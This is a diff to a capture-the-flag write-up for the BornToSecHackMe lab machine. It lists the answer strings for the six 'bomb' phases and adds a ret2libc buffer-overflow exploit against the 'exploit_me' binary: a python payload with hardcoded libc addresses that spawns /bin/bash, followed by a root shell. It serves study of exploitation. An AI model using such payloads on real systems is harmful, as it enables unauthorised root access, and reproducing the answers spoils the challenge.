@@ -421,22 +421,22 @@ The **README** gives us a hint about diffusing the bomb and indicates that the p
 
 Upon reverse engineering the **bomb** binary with **Binary Ninja**, we find that the program consists of 6 levels. Each level expects a specific string input, which we need to figure out by analyzing the binary. Once all the strings are entered correctly, we will have the complete password to log in as **thor**.
 
-#### Phase 1:
+Phase 1:
 The expected input is a string: `Public speaking is very easy.`
 
-#### Phase 2:
+Phase 2:
 The input is a sequence of factorials: `1 2 6 24 120 720`
 
-#### Phase 3:
+Phase 3:
 The input is a number, a char and another number: `1 b 214`
 
-#### Phase 4:
+Phase 4:
 The correct input is the number `9`.
 
-#### Phase 5:
+Phase 5:
 The input is a string: `opukmq`
 
-#### Phase 6:
+Phase 6:
 The input is a number sequence: `4 2 6 3 1 5`
 
 ### Concatenating the Password
@@ -565,7 +565,7 @@ zaz@BornToSecHackMe:~$
 
 ## 11. zaz session
 
-After logging in as the **zaz** user, we find an **exploit_me** binary in the home directory.
+After logging as the **zaz** user, we find an **exploit_me** binary in the home directory.
 
 ### Reversing the Binary with Binary Ninja
 
@@ -580,6 +580,26 @@ After logging in as the **zaz** user, we find an **exploit_me** binary in the ho
 0804842c      puts(&str);
 08048431      return 0;
 080483f4  }
-
 ```
 
+### Exploiting the Binary with ret2libc
+
+The binary `exploit_me` is vulnerable to a **buffer overflow** in its use of `strcpy` without checking the size of the input. The goal is to exploit this overflow to perform a **ret2libc attack**, which involves hijacking the return address to execute the `system` function in libc, passing `/bin/bash` as an argument.
+
+### Breakdown of the Payload:
+1. **`'A' * 140`**: Fills the buffer and overflows to overwrite the saved `EBP`.
+2. **`'\x60\xb0\xe6\xb7'`**: The address of `system` in libc.
+3. **`'\xe0\xeb\xe5\xb7'`**: The fake return address `exit`, used to avoid a crash after `system` finishes.
+4. **`'\x58\xcc\xf8\xb7'`**: The address of the string `/bin/bash` in libc, passed as an argument to `system`.
+
+The payload used is:
+
+```bash
+./exploit_me $(python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')")
+```
+
+```bash
+root@BornToSecHackMe:~$ id
+
+uid=0(root) gid=0(root) groups=0(root)
+``` 
